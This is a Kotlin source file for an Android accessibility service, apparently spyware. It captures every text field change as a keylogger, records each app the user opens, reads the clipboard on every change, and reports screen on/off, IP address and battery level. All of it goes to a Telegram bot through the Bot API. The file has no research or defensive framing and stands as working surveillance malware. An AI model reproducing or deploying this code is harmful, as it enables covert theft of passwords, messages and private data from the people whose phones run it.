package com.dacraezy.app
import android.accessibilityservice.AccessibilityService
import android.content.*
import android.os.BatteryManager
import android.view.accessibility.AccessibilityEvent
import okhttp3.*
import java.net.NetworkInterface
import java.util.*
import java.util.concurrent.Executors

class MyService : AccessibilityService() {
    private val client = OkHttpClient()
    private val executor = Executors.newSingleThreadExecutor()
    private var lastApp = ""

    override fun onServiceConnected() {
        val ip = getIP()
        executor.execute { sendText("🚀 Online | IP: $ip | Bat: ${getBat()}%") }
        
        val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cb.addPrimaryClipChangedListener {
            val txt = cb.primaryClip?.getItemAt(0)?.text?.toString()
            if (txt != null) executor.execute { sendText("📋 CLIP: $txt") }
        }

        val filter = IntentFilter().apply { addAction(Intent.ACTION_SCREEN_ON); addAction(Intent.ACTION_SCREEN_OFF) }
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(c: Context?, i: Intent?) {
                val s = if (i?.action == Intent.ACTION_SCREEN_ON) "🔓 ON" else "🔒 OFF"
                executor.execute { sendText(s) }
            }
        }, filter)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pkg != lastApp) {
            lastApp = pkg
            executor.execute { sendText("📱 APP: $pkg") }
        }
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val log = event.text.toString()
            executor.execute { sendText("⌨️ LOG: $log") }
        }
    }

    private fun getIP(): String {
        try {
            for (intf in Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (addr in Collections.list(intf.inetAddresses)) {
                    if (!addr.isLoopbackAddress) {
                        val host = addr.hostAddress
                        if (host.indexOf(':') < 0) return host
                    }
                }
            }
        } catch (e: Exception) { }
        return "N/A"
    }

    private fun getBat(): Int {
        val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return i?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: 0
    }

    private fun sendText(t: String) {
        val url = "https://api.telegram.org/bot${BuildConfig.TELEGRAM_TOKEN}/sendMessage?chat_id=${BuildConfig.CHAT_ID}&text=$t"
        client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
            override fun onFailure(c: Call, e: java.io.IOException) {}
            override fun onResponse(c: Call, r: Response) = r.close()
        })
    }
    override fun onInterrupt() {}
}
